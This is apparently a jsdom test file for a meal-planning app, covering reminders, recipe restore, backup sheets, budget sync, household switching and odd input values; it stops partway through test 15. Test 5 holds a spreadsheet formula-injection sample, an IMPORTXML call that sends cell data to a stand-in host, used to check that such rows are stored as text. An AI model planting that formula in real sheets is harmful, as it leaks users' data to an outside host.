// Fourth review's fixes (jsdom + in-memory store). Exits 1 if anything fails. `node test/review4_check.js 3` runs only test 3.
const { JSDOM } = require('jsdom'); const fs = require('fs');
const html = fs.readFileSync(__dirname + '/../public/index.html', 'utf8').replace(/<script src="(app|firebase-config)\.js[^"]*"><\/script>/g, '');
const lib = fs.readFileSync(__dirname + '/../public/data/library.json', 'utf8');
const bundle = fs.readFileSync(__dirname + '/app.test.js', 'utf8');
const pad = n => String(n).padStart(2, '0');
const iso = d => d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate());
const now = new Date(); const mon = new Date(now); mon.setDate(now.getDate() - ((now.getDay() + 6) % 7)); const day = k => { const x = new Date(mon); x.setDate(mon.getDate() + k); return x; };
const MON = iso(day(0)), NEXT = iso(day(7)), TODAY_IDX = (now.getDay() + 6) % 7, TODAY = iso(now);
const wait = ms => new Promise(r => setTimeout(r, ms));
let fails = 0; const ok = (cond, what) => { console.log((cond ? 'ok   ' : 'FAIL ') + what); if (!cond) fails++; };
const only = process.argv[2] ? Number(process.argv[2]) : 0;
function boot(opts) {
  opts = opts || {};
  const dom = new JSDOM(html, { runScripts: 'dangerously', pretendToBeVisual: true, url: 'https://x.github.io/es-kitchen/', beforeParse(w) {
    if (opts.pre) w.__preDocs = new Map(Object.entries(JSON.parse(JSON.stringify(opts.pre))));
    for (const k in (opts.local || {})) w.localStorage.setItem(k, opts.local[k]);
    Object.assign(w, opts.win || {});
    w.fetch = opts.fetch || (async () => ({ ok: true, json: async () => JSON.parse(lib) }));
    w.scrollTo = () => {};
  } });
  const w = dom.window, d = w.document; const errs = []; w.addEventListener('error', e => errs.push(e.message));
  w.console.warn = () => {};
  const s = d.createElement('script'); s.textContent = bundle; d.body.appendChild(s);
  if (opts.cal) w.Store.cal = opts.cal;
  const act = async (a, v, extra, ms) => { const b = d.createElement('button'); b.dataset.act = a; if (v != null) b.dataset.v = v; Object.assign(b.dataset, extra || {}); d.body.appendChild(b); b.click(); b.remove(); await wait(ms || 250); };
  const submit = async (sel, ms) => { d.querySelector(sel).dispatchEvent(new w.Event('submit', { bubbles: true, cancelable: true })); await wait(ms || 400); };
  const docAt = p => w.__docs.get(p);
  const switchTo = async hid => { w.__docs.set('users/u_ethan', { ...w.__docs.get('users/u_ethan'), current: hid }); await w.__refreshMe(); await wait(3000); };
  return { w, d, errs, act, submit, docAt, switchTo };
}
const R = ['it_tuna_puttanesca', 'in_chicken_tikka_masala', 'br_cottage_pie', 'am_sloppy_joes', 'as_sweet_sour_chicken', 'am_double_smash_burgers', 'am_jambalaya'];
const R2 = ['am_buttermilk_chicken_burger', 'am_philly_cheesesteak', 'am_meatball_subs', 'am_chicken_pot_pie', 'as_chicken_katsu_curry', 'am_bbq_bacon_burger', 'am_mini_meatloaves'];
const planned = list => { const days = {}; (list || R).forEach((r, k) => { days['d' + k] = { r }; }); return { days }; };
const home = (hid, name, extra) => ({ ['households/' + hid]: { name, members: ['u_ethan'], memberNames: { u_ethan: 'Ethan' }, inviteCode: 'C' + hid },
  ['households/' + hid + '/people/u_ethan']: { name: 'Ethan', uid: 'u_ethan', order: 1 }, ...(extra || {}) });

(async () => {
  // ---- 1. Caledonite reminders: each household linked to Caledonite keeps its own; unlinking takes back what's waiting ----
  if (!only || only === 1) {
    const NOTIFS = {}, GONE = []; let writes = 0;
    const CAL = { household: { dinnerTime: '19:00' }, people: [{ id: 'ethan', name: 'Ethan', email: 'ethan@example.com', settings: { hasShifts: true } }], calendars: [],
      shifts: [0, 1, 2, 3, 4, 5, 6].map(k => ({ person: 'ethan', day: iso(day(k)), type: 'night' })), feeds: [], me: 'ethan' };
    const cal = { onUser(cb) { setTimeout(() => cb({ email: 'ethan@example.com', uid: 'c1' }), 0); return () => {}; }, async signIn() {}, async signOut() {}, async read() { return JSON.parse(JSON.stringify(CAL)); },
      async notify(id, data) { writes++; NOTIFS[id] = data; return 'ok'; }, async unnotify(id) { GONE.push(id); delete NOTIFS[id]; } };
    const remind = { remind: { cook: true, defrost: true, plates: true, cookAt: '23:59' } };
    const pre = { 'users/u_ethan': { households: ['h1', 'h2'], current: 'h1', names: { h1: 'Home', h2: 'Mum’s' } },
      ...home('h1', 'Home', { ['households/h1/weeks/' + MON]: planned(), 'households/h1/config/settings': remind }),
      ...home('h2', 'Mum’s', { ['households/h2/weeks/' + MON]: planned(R2), 'households/h2/config/settings': remind }) };
    // a reminder queued before reminders named their household, for a night still to come
    const later = Math.min(6, TODAY_IDX + 1), oldId = 'pk-' + MON + '-' + later + '-cook-ethan';
    NOTIFS[oldId] = { to: 'ethan', kind: 'reminders' };
    const A = boot({ pre, cal, local: { 'peckish.cal': JSON.stringify(['h1', 'h2']), 'peckish.calNotes': JSON.stringify({ [oldId]: 'x' }) } });
    await wait(9000);
    const ids = () => Object.keys(NOTIFS).filter(id => id.startsWith('pk-' + MON + '-'));
    const h1 = ids(); const plate = h1.filter(id => /-plate-/.test(id)), mark = () => h1.map(id => (NOTIFS[id] || {}).title || 'gone').join('|'), h1Text = mark();
    ok(h1.length > 0 && !NOTIFS[oldId] && !h1.some(id => id === 'pk-' + MON + '-' + later + '-cook-ethan'), 'reminders: an old-style reminder is replaced by this household’s own, not sent twice (' + h1.length + ')');
    const w0 = writes; await A.act('tick', 'milk', null, 6500);
    ok(writes === w0 || !plate.length, 'reminders: "save you a plate?" isn’t queued again every time something changes (' + (writes - w0) + ' writes)');
    await A.switchTo('h2'); await A.act('tick', 'milk', null, 7000);
    const both = ids();
    ok(mark() === h1Text, 'reminders: opening another household linked to Caledonite doesn’t replace or take back the first one’s');
    ok(both.length > h1.length, 'reminders: and the second household queues its own alongside (' + (both.length - h1.length) + ')');
    await A.act('tab', 'settings'); await A.act('set-page', 'linked'); await A.act('cal-unlink', null, null, 1500);
    const left = ids();
    ok(mark() === h1Text && left.length === h1.length, 'reminders: unlinking Caledonite in one household takes back its waiting reminders and keeps the other’s (' + left.length + ' of ' + h1.length + ')');
    ok(!A.errs.length, 'reminders: no page errors ' + A.errs.join(' | '));
  }
  // ---- 2. a recipe removed from the library: still on the weeks it was planned in, and can be brought back ----
  if (!only || only === 2) {
    const days = planned().days; days.d1 = { r: 'my_deleted_one' }; // a recipe of yours that's since been deleted
    const pre = { 'users/u_ethan': { households: ['h1'], current: 'h1', names: { h1: 'Home' } }, ...home('h1', 'Home', { ['households/h1/weeks/' + MON]: { days },
      'households/h1/recipes/br_cottage_pie': { ...JSON.parse(lib).recipes.find(r => r.id === 'br_cottage_pie'), title: 'Nan’s cottage pie', short: undefined } }) };
    const A = boot({ pre }); await wait(2500);
    const seg = () => (A.d.querySelector('[data-act="week-view"][data-v="dinners"]') || {}).textContent || '';
    ok(/6\/7/.test(seg()) && !!A.d.querySelector('[data-act="fill"]'), 'removed: a night whose recipe was deleted counts as one still to choose (' + seg() + ')');
    await A.act('fill', null, null, 6000);
    const n1 = ((A.docAt('households/h1/weeks/' + MON).days || {}).d1 || {}).r;
    ok(!!n1 && n1 !== 'my_deleted_one' && !!JSON.parse(lib).recipes.find(r => r.id === n1), 'removed: and "Fill the rest" gives it a dinner (' + n1 + ')');
    for (const id of ['it_tuna_puttanesca', 'br_cottage_pie']) { await A.act('open-recipe', id, null, 400); await A.act('del-recipe', id, null, 300); await A.act('del-recipe-yes', id, null, 600); }
    const titles = () => [...A.d.querySelectorAll('.meal .ttl')].map(x => x.textContent).join(' | ');
    ok(/Tuna puttanesca/.test(titles()) && /Nan.s cottage pie/i.test(titles()), 'removed: dinners already planned stay on the week (' + titles().slice(0, 80) + ')');
    const pie = A.docAt('households/h1/recipes/br_cottage_pie') || {};
    ok(pie.hidden === true && /Nan/.test(pie.title || ''), 'removed: your edits to a library recipe are kept when it’s removed');
    const search = async q => { const el = A.d.querySelector('#rq'); el.value = q; el.dispatchEvent(new A.w.Event('input', { bubbles: true })); await wait(300); const f = A.d.activeElement; if (f && f.blur) f.blur(); if (f) f.dispatchEvent(new A.w.FocusEvent('focusout', { bubbles: true })); await wait(100); };
    await A.act('tab', 'recipes', null, 500); await search('tuna');
    const listed = () => [...A.d.querySelectorAll('.vcard')].map(x => x.dataset.v);
    ok(!listed().includes('it_tuna_puttanesca') && /you removed/.test(A.d.querySelector('#app').textContent), 'removed: it isn’t listed, and the page says how many you removed');
    await A.act('show-hidden', null, null, 300);
    ok(listed().includes('it_tuna_puttanesca'), 'removed: "Show them" lists it');
    await A.act('open-recipe', 'it_tuna_puttanesca', null, 400);
    ok(!!A.d.querySelector('[data-act="restore-recipe"]'), 'removed: its page offers to bring it back');
    await A.act('restore-recipe', 'it_tuna_puttanesca', null, 600); await A.act('sheet-back');
    await A.act('open-recipe', 'br_cottage_pie', null, 400); await A.act('restore-recipe', 'br_cottage_pie', null, 600); await A.act('sheet-back');
    const pie2 = A.docAt('households/h1/recipes/br_cottage_pie') || {};
    ok(!A.docAt('households/h1/recipes/it_tuna_puttanesca') && !pie2.hidden && /Nan/.test(pie2.title || '') && !('removed' in pie2), 'removed: bringing them back keeps your edits');
    await A.act('show-hidden', null, null, 300); await search('tuna'); const t1 = listed(); await search('cottage'); const t2 = listed();
    ok(t1.includes('it_tuna_puttanesca') && t2.includes('br_cottage_pie'), 'removed: and they’re back in the library');
    await A.act('edit-recipe', 'it_tuna_puttanesca', null, 400); A.d.querySelector('#rf-title').value = 'Ethan’s puttanesca'; await A.submit('[data-form="recipe"]', 600);
    await A.act('tab', 'week', null, 500);
    ok(/Ethan.s puttanesca/.test(titles()), 'recipes: a library recipe you rename shows its new name on the week (' + titles().slice(0, 40) + ')');
    ok(!A.errs.length, 'removed: no page errors ' + A.errs.join(' | '));
  }
  // ---- 3. no signal and a week this phone has never fetched: it isn't planned over the other phone's plan by accident ----
  if (!only || only === 3) {
    const A = boot({ win: { __noCache: true } }); await wait(150); await A.submit('[data-form="create"]', 1500);
    const txt = () => A.d.querySelector('#app').textContent, days = () => Object.keys((A.docAt('households/h1/weeks/' + MON) || {}).days || {}).length;
    ok(/hasn.t been able to fetch this week/.test(txt()), 'no signal: the week says it couldn\u2019t be fetched yet');
    await A.act('fill', null, null, 3000);
    ok(days() === 0 && /Plan it anyway/.test(txt()), 'no signal: the first tap on Fill plans nothing and asks again (' + days() + ' nights written)');
    await A.act('fill', null, null, 6000);
    ok(days() > 0, 'no signal: a second tap plans it (' + days() + ' nights)');
    const B = boot(); await wait(150); await B.submit('[data-form="create"]', 1500); await B.act('fill', null, null, 6000);
    ok(Object.keys((B.docAt('households/h1/weeks/' + MON) || {}).days || {}).length > 0 && !/fetch this week/.test(B.d.querySelector('#app').textContent), 'with signal: one tap fills the week as before');
    ok(!A.errs.length && !B.errs.length, 'no signal: no page errors ' + A.errs.concat(B.errs).join(' | '));
  }
  // ---- 4. a new household can be restored from the backup sheet, from the household it replaces (by its invite code) ----
  if (!only || only === 4) {
    const vm = require('vm'), gs = {}; vm.createContext(gs); vm.runInContext(fs.readFileSync(__dirname + '/../../../apps-script/Code.gs', 'utf8'), gs);
    const tab = rows => ({ getLastRow: () => rows.length + 1, getRange: (r, c, nr, nc) => ({ getValues: () => rows.slice(r - 2, r - 2 + nr).map(x => x.slice(c - 1, c - 1 + nc)) }) });
    const rec = JSON.stringify({ title: 'Nan\u2019s stew', ingredients: [], steps: [] });
    const ss = { getSheetByName: n => ({ Docs: tab([['hOld', 'recipes/my_stew', 1, 2, rec.slice(0, 10), '2026-10-01T10:00:00Z'], ['hOld', 'recipes/my_stew', 2, 2, rec.slice(10), '2026-10-01T10:00:00Z'], ['hFam', 'recipes/fam', 1, 1, rec, '2026-10-02']]),
      Households: tab([['hOld', 'Old home', 'K7RM2Q'], ['hFam', 'Mum\u2019s', 'MUMS22']]), BackupLog: tab([['2026-10-01', 'hOld', 'Old home', 'Ethan']]) })[n] || null };
    const asked = gs.restore_(ss, 'hNew', ''), got = gs.restore_(ss, 'hNew', 'k7rm2q');
    ok(asked.ok && !asked.docs.length && asked.needCode && !JSON.stringify(asked).includes('hOld') && !JSON.stringify(asked).includes('Mum'), 'restore: the sheet asks for a code when this household isn\u2019t there, without naming any other household');
    ok(got.docs.length === 1 && got.docs[0].data.title === 'Nan\u2019s stew' && got.by === 'Ethan' && got.name === 'Old home', 'restore: and gives back the household with that invite code');
    let wrong = ''; try { gs.restore_(ss, 'hNew', 'NOPE99'); } catch (e) { wrong = e.message; }
    ok(/invite code/.test(wrong), 'restore: a code no household has gets nothing');
    // the app: asks for the code, then restores that household into this one
    const fetch = async (url, opt) => {
      if (!/script\.google\.com/.test(url)) return { ok: true, json: async () => JSON.parse(lib) };
      const b = JSON.parse(opt.body); let r = { ok: true };
      try { if (b.action === 'restore') r = gs.restore_(ss, b.hid, b.code || ''); } catch (e) { r = { ok: false, error: e.message }; }
      return { ok: true, text: async () => JSON.stringify(r), json: async () => r };
    };
    const pre = { 'users/u_ethan': { households: ['h1'], current: 'h1', names: { h1: 'Home' } }, ...home('h1', 'Home', { 'households/h1/config/backup': { url: 'https://script.google.com/macros/s/x/exec', key: 'k', auto: false } }) };
    const A = boot({ pre, fetch }); await wait(2500);
    await A.act('tab', 'settings'); await A.act('set-page', 'backup'); await A.act('restore-sheet', null, null, 800);
    ok(!!A.d.querySelector('[data-form="restore-code"]'), 'restore: the app asks for the invite code of the household it replaces');
    A.d.querySelector('#rs-code').value = 'k7rm2q'; await A.submit('[data-form="restore-code"]', 800);
    ok(/Restore this backup/.test(A.d.querySelector('#app').textContent) && /Old home/.test(A.d.querySelector('#app').textContent), 'restore: and shows what it would restore before changing anything');
    await A.act('restore-yes', null, null, 800);
    ok(((A.docAt('households/h1/recipes/my_stew') || {}).title || '') === 'Nan\u2019s stew' && !A.docAt('households/h1/recipes/fam'), 'restore: only that household\u2019s records are put into this one');
    ok(!A.errs.length, 'restore: no page errors ' + A.errs.join(' | '));
  }
  // ---- 5. backup sheet: another household's rows that are kept are still written back as text, never as a formula ----
  if (!only || only === 5) {
    const vm = require('vm'), gs = {}; vm.createContext(gs); vm.runInContext(fs.readFileSync(__dirname + '/../../../apps-script/Code.gs', 'utf8'), gs);
    let cells = [['household_id', 'person_id', 'name'], ['hFam', 'p1', '=IMPORTXML("https://x.example/?"&A1)'], ['hFam', 'p2', '-4.5']]; let written = null;
    const sh = { getLastRow: () => cells.length, getLastColumn: () => 3, getMaxColumns: () => 3, getRange: (r, c, nr, nc) => ({ getValues: () => cells.slice(r - 1, r - 1 + nr).map(x => x.slice(c - 1, c - 1 + nc)),
      setValues(v) { if (r === 2) written = v; return this; }, setFontWeight() { return this; }, setNumberFormat() { return this; } }), clearContents() {}, setFrozenRows() {}, deleteColumns() {} };
    gs.writeTable_(sh, ['household_id', 'person_id', 'name'], [['h1', 'u1', 'Ethan']], 'h1');
    const fam = (written || []).find(x => x[1] === 'p1') || [], num = (written || []).find(x => x[1] === 'p2') || [];
    ok(fam[2] === '\'=IMPORTXML("https://x.example/?"&A1)' && num[2] === '-4.5', 'backup sheet: a kept row that looks like a formula is written back as text (' + fam[2] + ')');
  }
  // ---- 6. Budgie: each of you keeps your own choice of food budget, and your partner's shared food payments come through ----
  if (!only || only === 6) {
    const B = { people: [{ id: 'ethan', name: 'Ethan' }, { id: 'sophie', name: 'Sophie' }], budgets: [{ id: 'bud-e1', person: 'ethan', name: 'Food' }, { id: 'bud-e2', person: 'ethan', name: 'Groceries' }],
      transactions: [{ id: 't-sophie1', date: TODAY, person: 'sophie', amount: 23.5, budget: 'bud-s9', split: 'half', note: 'Aldi' }], splits: [], accounts: [] };
    const posts = [];
    const fetch = async (url, opt) => { if (!/script\.google\.com/.test(url)) return { ok: true, json: async () => JSON.parse(lib) }; const b = JSON.parse(opt.body); posts.push(b); return { ok: true, json: async () => ({ ok: true, person: 'ethan', keyType: 'app', now: Date.now(), full: true, rows: B }) }; };
    // Sophie picked her food budget on her phone (saved before choices were kept per person)
    const pre = { 'users/u_ethan': { households: ['h1'], current: 'h1', names: { h1: 'Home' } }, ...home('h1', 'Home', { 'households/h1/people/p_s': { name: 'Sophie', order: 2 },
      'households/h1/config/settings': { budgieBudget: 'bud-s1', budgieBudgets: { sophie: 'bud-s1' } }, ['households/h1/weeks/' + MON]: planned() }) };
    const A = boot({ pre, fetch, local: { 'peckish.budgie': JSON.stringify({ u: 'https://script.google.com/macros/s/B/exec', k: 'app_peckish_' + 'c'.repeat(64), hid: 'h1' }) } });
    await wait(5000);
    const imp = A.docAt('households/h1/shops/b_t_sophie1') || {};
    ok(imp.amount === 23.5 && imp.paidBy === 'p_s' && imp.source === 'budgie', 'budgie: Sophie\u2019s shared food payment shows up on Ethan\u2019s phone (' + JSON.stringify(imp).slice(0, 80) + ')');
    await A.act('tab', 'settings'); await A.act('set-page', 'linked', null, 400);
    const sel = A.d.querySelector('[data-change="bg-budget"]'); sel.value = 'bud-e2'; sel.dispatchEvent(new A.w.Event('change', { bubbles: true })); await wait(400);
    const st = A.docAt('households/h1/config/settings') || {};
    ok(st.budgieBudgets && st.budgieBudgets.ethan === 'bud-e2' && st.budgieBudgets.sophie === 'bud-s1', 'budgie: choosing your food budget keeps the other person\u2019s choice (' + JSON.stringify(st.budgieBudgets) + ')');
    await A.act('tab', 'shop', null, 400); await A.act('shop-view', 'cost', null, 400);
    A.d.querySelector('#ls-amt').value = '41.20'; await A.submit('[data-form="logshop"]', 2500);
    const sent = posts.flatMap(b => b.ops || []).find(o => o.row && o.row.amount === 41.2);
    ok(sent && sent.row.budget === 'bud-e2', 'budgie: and your shops go to the budget you chose (' + (sent && sent.row.budget) + ')');
    ok(!A.errs.length, 'budgie: no page errors ' + A.errs.join(' | '));
    // one of Ethan's own that Sophie's phone brought in, since taken off in Budgie: Ethan's phone takes it off here too
    await A.w.Store.set('shops/b_t_gone', { date: TODAY, amount: 9, shop: 'tesco', paidBy: 'u_ethan', source: 'budgie', budgie: { state: 'sent', tid: 't-gone', person: 'ethan' }, via: 'sophie', week: MON }); await wait(300);
    await A.act('tab', 'settings'); await A.act('set-page', 'linked', null, 300); await A.act('bg-sync', null, null, 2500);
    ok(!A.docAt('households/h1/shops/b_t_gone'), 'budgie: a payment taken off in Budgie goes from the payer\u2019s phone, whichever phone brought it in');
  }
  // ---- 7. moving a dinner to another night: guests stay on the night they're coming ----
  if (!only || only === 7) {
    const wk = planned(); wk.days.d0.guests = 2; delete wk.days.d2;
    const pre = { 'users/u_ethan': { households: ['h1'], current: 'h1', names: { h1: 'Home' } }, ...home('h1', 'Home', { ['households/h1/weeks/' + MON]: wk }) };
    const A = boot({ pre }); await wait(2500);
    await A.act('open-day', '0', null, 400); await A.act('move-day', '0', { to: '2' }, 500);
    const days = (A.docAt('households/h1/weeks/' + MON) || {}).days || {};
    ok(days.d2 && days.d2.r === R[0] && !days.d2.guests && days.d0 && !days.d0.r && days.d0.guests === 2, 'move: the dinner moves, the guests stay on their night (' + JSON.stringify([days.d0, days.d2]) + ')');
    ok(!A.errs.length, 'move: no page errors ' + A.errs.join(' | '));
  }
  // ---- 8. no leftover styles or icons that nothing uses ----
  if (!only || only === 8) {
    const src = fs.readFileSync(__dirname + '/../src/app.js', 'utf8'), css = html.match(/<style>([\s\S]*?)<\/style>/)[1], markup = html.replace(css, '');
    const classes = [...new Set([...css.replace(/url\([^)]*\)/g, '').matchAll(/\.([a-zA-Z][\w-]*)/g)].map(m => m[1]))].filter(c => !/^c-/.test(c));
    const unused = classes.filter(c => !new RegExp('[\'" ]' + c + '[\'" ]').test(src) && !new RegExp('class="[^"]*\\b' + c + '\\b').test(markup) && !src.includes("'" + c) && !src.includes(c + "'"));
    ok(!unused.length, 'dead code: every style is used (' + unused.join(' ') + ')');
    const icons = [...src.match(/const ICON = \{([\s\S]*?)\n\};/)[1].matchAll(/^\s+([a-z]+):/gm)].map(m => m[1]);
    const tabs = ['week', 'recipes', 'shop', 'kitchen', 'settings'];
    ok(icons.every(k => tabs.includes(k) || new RegExp('ICON\\.' + k + '\\b').test(src)), 'dead code: every icon is used (' + icons.filter(k => !tabs.includes(k) && !new RegExp('ICON\\.' + k + '\\b').test(src)).join(' ') + ')');
  }
  // ---- 9. leaving a household you're the only one in says it can't be opened again ----
  if (!only || only === 9) {
    const pre = { 'users/u_ethan': { households: ['h1', 'h2'], current: 'h1', names: { h1: 'Home', h2: 'Shared' } }, ...home('h1', 'Home'),
      'households/h2': { name: 'Shared', members: ['u_ethan', 'u_s'], memberNames: { u_ethan: 'Ethan', u_s: 'Sophie' }, inviteCode: 'SHARED' }, 'households/h2/people/u_ethan': { name: 'Ethan', uid: 'u_ethan', order: 1 } };
    const A = boot({ pre }); await wait(2500);
    await A.act('tab', 'settings'); await A.act('set-page', 'household'); await A.act('leave');
    ok(/only one in it/.test(A.d.querySelector('#app').textContent), 'leaving: the last one in a household is told nobody can open it again');
    await A.switchTo('h2'); await A.act('tab', 'settings'); await A.act('set-page', 'household'); await A.act('leave');
    ok(!/only one in it/.test(A.d.querySelector('#app').textContent) && !!A.d.querySelector('[data-act="leave-yes"]'), 'leaving: with others still in it, there\u2019s no such note');
  }
  // ---- 10. switching household while something slow is going on doesn't write into (or mix in) the other household ----
  if (!only || only === 10) {
    const two = () => ({ 'users/u_ethan': { households: ['h1', 'h2'], current: 'h1', names: { h1: 'Home', h2: 'Mum\u2019s' } }, ...home('h1', 'Home', { 'households/h1/config/backup': { url: 'https://script.google.com/macros/s/x/exec', key: 'k', auto: false } }),
      ...home('h2', 'Mum\u2019s', { 'households/h2/config/backup': { url: 'https://script.google.com/macros/s/y/exec', key: 'k2', auto: false }, 'households/h2/people/u_mum': { name: 'Mum', order: 2 } }) });
    const daysIn = (A, hid) => Object.keys(((A.docAt('households/' + hid + '/weeks/' + MON) || {}).days) || {}).length;
    // "Fill it for me" still working
    { const A = boot({ pre: two() }); await wait(2500);
      const sw = A.switchTo('h2'); await A.act('fill', null, null, 1); await sw; await wait(6000);
      ok(daysIn(A, 'h2') === 0, 'switching: a plan still being worked out isn\u2019t put on the other household\u2019s week (' + daysIn(A, 'h2') + ' nights)'); }
    // a restore going on
    { const A = boot({ pre: two() }); await wait(2500);
      const set0 = A.w.Store.set; A.w.Store.set = function () { const p = set0.apply(this, arguments); return new Promise(r => setTimeout(r, 60)).then(() => p); }; // the path is fixed when it's called, as in Firestore; the answer is slow
      const docs = []; for (let k = 0; k < 30; k++) docs.push({ path: 'recipes/my_r' + k, data: { title: 'R' + k, ingredients: [], steps: [] } });
      const f = { name: 'b.json', text: async () => JSON.stringify({ app: 'Peckish', docs }) };
      await A.act('tab', 'settings'); await A.act('set-page', 'backup');
      const inp = A.d.querySelector('#restore-file'); Object.defineProperty(inp, 'files', { value: [f] }); inp.dispatchEvent(new A.w.Event('change', { bubbles: true })); await wait(400);
      await A.act('restore-yes', null, null, 300); await A.switchTo('h2'); await wait(3000);
      const inH2 = [...A.w.__docs.keys()].filter(k => k.startsWith('households/h2/recipes/my_r')).length, inH1 = [...A.w.__docs.keys()].filter(k => k.startsWith('households/h1/recipes/my_r')).length;
      ok(inH1 > 0 && inH2 === 0, 'switching: a restore under way stops rather than carrying on into the other household (' + inH1 + ' here, ' + inH2 + ' there)'); }
    // a backup going on
    { let slow = null; const fetch = async (url, opt) => { if (!/script\.google\.com/.test(url)) return { ok: true, json: async () => JSON.parse(lib) }; await new Promise(r => { slow = r; setTimeout(r, 1500); }); const r = { ok: true, sheetUrl: 'https://docs.google.com/x' }; return { ok: true, text: async () => JSON.stringify(r), json: async () => r }; };
      const A = boot({ pre: two(), fetch }); await wait(2500);
      await A.act('tab', 'settings'); await A.act('set-page', 'backup'); await A.act('backup-now', null, null, 200); await A.switchTo('h2'); await wait(2500);
      const b2 = A.docAt('households/h2/config/backup') || {};
      ok(!b2.last && !b2.lastTry && !b2.counts, 'switching: the other household\u2019s backup isn\u2019t marked as done (or failed) by this one\u2019s (' + JSON.stringify(b2).slice(0, 90) + ')');
      // connecting a backup sheet: the answer comes back after you've switched
      await A.switchTo('h1'); await A.act('tab', 'settings'); await A.act('set-page', 'backup', null, 300);
      A.d.querySelector('#bk-url').value = 'https://script.google.com/macros/s/new/exec'; A.d.querySelector('#bk-key').value = 'newkey';
      await A.submit('[data-form="backup-connect"]', 200); await A.switchTo('h2'); await wait(2000);
      ok((A.docAt('households/h2/config/backup') || {}).key === 'k2', 'switching: a backup sheet being connected in one household isn\u2019t connected to the other'); }
  }
  // ---- 11. history: a logged shop with no proper date doesn't make an "Invalid Date" month ----
  if (!only || only === 11) {
    const pre = { 'users/u_ethan': { households: ['h1'], current: 'h1', names: { h1: 'Home' } }, ...home('h1', 'Home', { ['households/h1/weeks/' + MON]: planned(),
      'households/h1/shops/s1': { date: 'soon', amount: 12, shop: 'tesco', source: 'peckish' }, 'households/h1/shops/s2': { date: TODAY, amount: 30, shop: 'tesco', source: 'peckish' } }) };
    const A = boot({ pre }); await wait(2500);
    await A.act('tab', 'settings'); await A.act('set-page', 'history', null, 1200);
    const t = A.d.querySelector('#app').textContent;
    ok(/Spending by month/.test(t) && !/Invalid/.test(t), 'history: no "Invalid Date" month from a shop without a proper date');
  }
  // ---- 12. the same night changed on both phones at once: a dinner swapped on one and guests added on the other both stay ----
  if (!only || only === 12) {
    const pre = { 'users/u_ethan': { households: ['h1'], current: 'h1', names: { h1: 'Home' } }, ...home('h1', 'Home', { ['households/h1/weeks/' + MON]: planned() }) };
    const A = boot({ pre }); await wait(2000);
    // B shares A's database (as two phones do); neither sees the other's change before saving its own
    const shared = A.w.__docs; const C = (() => { const dom = new JSDOM(html, { runScripts: 'dangerously', pretendToBeVisual: true, url: 'https://x.github.io/es-kitchen/', beforeParse(w) { w.__preDocs = shared; w.fetch = async () => ({ ok: true, json: async () => JSON.parse(lib) }); w.scrollTo = () => {}; w.console.warn = () => {}; } }); const s2 = dom.window.document.createElement('script'); s2.textContent = bundle; dom.window.document.body.appendChild(s2); return dom.window; })();
    await wait(2000);
    await A.act('open-day', '0', null, 400); await A.act('guests', '0', { n: '2' }, 300);
    const b = C.document.createElement('button'); b.dataset.act = 'swap-day'; b.dataset.v = '0'; C.document.body.appendChild(b); b.click(); await wait(500);
    const d0 = ((shared.get('households/h1/weeks/' + MON) || {}).days || {}).d0 || {};
    ok(d0.r && d0.r !== R[0] && d0.guests === 2, 'same night: the swap on one phone and the guests on the other are both kept (' + JSON.stringify(d0).slice(0, 90) + ')');
  }
  // ---- 13. odd values in a week or a person don't stop the app opening ----
  if (!only || only === 13) {
    const wk = planned(); wk.shop = 'morrisons';
    const pre = { 'users/u_ethan': { households: ['h1'], current: 'h1', names: { h1: 'Home' } }, ...home('h1', 'Home', { ['households/h1/weeks/' + MON]: wk,
      'households/h1/people/p_s': { name: 'Sophie', order: 2, plan: { b: true, l: true }, days: { b: 5, l: [0, 1, 2, 3, 4] }, usual: { b: ['lo'], l: 7 } } }) };
    const A = boot({ pre }); await wait(2500);
    const t = () => A.d.querySelector('#app').textContent;
    ok(/Tuna puttanesca/.test(t()) && !A.errs.length, 'odd values: a week saved with a shop the app doesn\u2019t know still opens (' + A.errs.slice(0, 1).join('') + ')');
    await A.act('tab', 'shop', null, 500);
    ok(/Prices at Tesco/.test(t()), 'odd values: and its list is priced at your usual shop');
    await A.act('tab', 'week', null, 300); await A.act('week-view', 'bl', null, 400); await A.act('bl-person', 'p_s', null, 400);
    await A.act('tab', 'settings'); await A.act('set-page', 'people'); await A.act('set-person', 'p_s', null, 300);
    ok(!A.errs.length, 'odd values: a person saved with odd breakfast and lunch days doesn\u2019t break the pages that show them ' + A.errs.slice(0, 2).join(' | '));
  }
  // ---- 14. a huge number in a record (guests, portions, amounts, pack sizes) doesn't freeze or break the planner ----
  if (!only || only === 14) {
    const wk = planned(); wk.days.d0.guests = 1e9; wk.days.d1.extra = 1e12; wk.carryEdited = true; wk.carryIn = [{ i: 'beef_mince', q: 1e15, exp: MON }]; wk.freezerMeals = [{ r: 'br_cottage_pie', portions: 1e9 }];
    const pre = { 'users/u_ethan': { households: ['h1'], current: 'h1', names: { h1: 'Home' } }, ...home('h1', 'Home', { ['households/h1/weeks/' + MON]: wk,
      'households/h1/people/p_s': { name: 'Sophie', order: 2, portion: 1e9 },
      'households/h1/ingredients/beef_mince': { prices: { tesco: { pack: 1e-9, price: 4, checked: MON, src: 'Your receipt' } } },
      'households/h1/ingredients/ing_tiny': { name: 'Tiny', unit: 'g', packs: [1e-9], custom: true, prices: { tesco: { pack: 1e-9, price: 1 } } },
      'households/h1/recipes/my_big': { title: 'Big', cuisine: 'British', protein: 'beef', time: 1e9, servings: 1e9, custom: true, ingredients: [{ i: 'ing_tiny', q: 1e12 }], steps: [{ text: 'Cook' }] } }) };
    pre['households/h1/weeks/' + MON].days.d2 = { r: 'my_big' };
    const t0 = Date.now(); const A = boot({ pre }); await wait(3000);
    await A.act('tab', 'shop', null, 600); await A.act('tab', 'kitchen', null, 400); await A.act('tab', 'week', null, 400);
    ok(!A.errs.length && /Tuna puttanesca/.test(A.d.querySelector('#app').textContent) && Date.now() - t0 < 20000, 'huge numbers: the week, list and kitchen still open (' + A.errs.slice(0, 1).join('') + ')');
  }
  // ---- 15. ticking or removing an extra item hits that item, even if the other phone added one above it meanwhile ----
  if (!only || only === 15) {
    const wk = planned(); wk.extras = { xa: { name: 'foil', done: false, o: 10 }, xb: { name: 'bin bags', done: false, o: 20 } };
    const pre = { 'users/u_ethan': { households: ['h1'], current: 'h1', names: { h1: 'Home' } }, ...home('h1', 'Home', { ['households/h1/weeks/' + MON]: wk }) };
    const A = boot({ pre }); await wait(2500); await A.act('tab', 'shop', null, 500);
    const btn = (act, name) => [...A.d.querySelectorAll('[data-act="' + act + '"]')].find(b => (b.getAttribute('aria-label') || '').includes(name));
